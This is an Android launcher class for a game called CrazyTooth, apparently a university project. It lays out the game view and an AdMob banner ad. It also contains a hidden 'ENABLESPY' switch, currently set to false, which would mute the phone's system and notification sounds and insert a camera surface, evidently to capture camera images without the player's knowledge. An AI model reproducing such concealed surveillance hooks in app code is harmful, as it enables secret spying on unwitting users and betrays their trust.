package ca.uqac.game.android;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup.LayoutParams;
import android.view.Window;
import android.view.WindowManager;
import android.widget.RelativeLayout;

import com.badlogic.gdx.backends.android.AndroidApplication;
import com.badlogic.gdx.backends.android.AndroidApplicationConfiguration;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdSize;
import com.google.android.gms.ads.AdView;

import ca.uqac.game.CrazyTooth;

public class AndroidLauncher extends AndroidApplication {
	private static final boolean ENABLESPY = false;

	CameraSurface cameraSurface;
	AdView adView;
	View gameView;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		AndroidApplicationConfiguration config = new AndroidApplicationConfiguration();
		config.useAccelerometer = false;
		config.useCompass = false;

		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
				WindowManager.LayoutParams.FLAG_FULLSCREEN);
		getWindow().clearFlags(
				WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN);

		RelativeLayout layout = new RelativeLayout(this);
		RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(
				RelativeLayout.LayoutParams.MATCH_PARENT,
				RelativeLayout.LayoutParams.MATCH_PARENT);
		layout.setLayoutParams(params);

		createAdView();
		createGameView(config);

		layout.addView(gameView);
		if (ENABLESPY) {
			AudioManager manager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
			manager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
			manager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
			manager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
			manager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
			manager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

			cameraSurface = new CameraSurface(this);
			params = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT,
					LayoutParams.WRAP_CONTENT);
			cameraSurface.setLayoutParams(params);
			layout.addView(cameraSurface);
		}
		layout.addView(adView);

		setContentView(layout);
		startAdvertising(adView);
	}

	private AdView createAdView() {
		adView = new AdView(this);
		adView.setAdSize(AdSize.SMART_BANNER);
		adView.setAdUnitId("ca-app-pub-7283861277343743/2939981717");
		RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);
		params.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM, RelativeLayout.TRUE);
		params.addRule(RelativeLayout.CENTER_HORIZONTAL, RelativeLayout.TRUE);
		adView.setLayoutParams(params);
		return adView;
	}

	private View createGameView(AndroidApplicationConfiguration config) {
		gameView = initializeForView(new CrazyTooth(), config);
		RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(
				LayoutParams.MATCH_PARENT, LayoutParams.WRAP_CONTENT);
		params.addRule(RelativeLayout.ALIGN_PARENT_TOP, RelativeLayout.TRUE);
		params.addRule(RelativeLayout.CENTER_HORIZONTAL, RelativeLayout.TRUE);
		params.addRule(RelativeLayout.ABOVE, adView.getId());
		gameView.setLayoutParams(params);
		return gameView;
	}

	private void startAdvertising(AdView adView) {
		AdRequest adRequest = new AdRequest.Builder().build();
		adView.loadAd(adRequest);
	}

	@Override
	public void onPause() {
		if (adView != null) {
			adView.pause();
		}
		super.onPause();
	}

	@Override
	public void onResume() {
		super.onResume();
		if (adView != null) {
			adView.resume();
		}
	}

	@Override
	public void onDestroy() {
		if (adView != null) {
			adView.destroy();
		}
		super.onDestroy();
	}
}
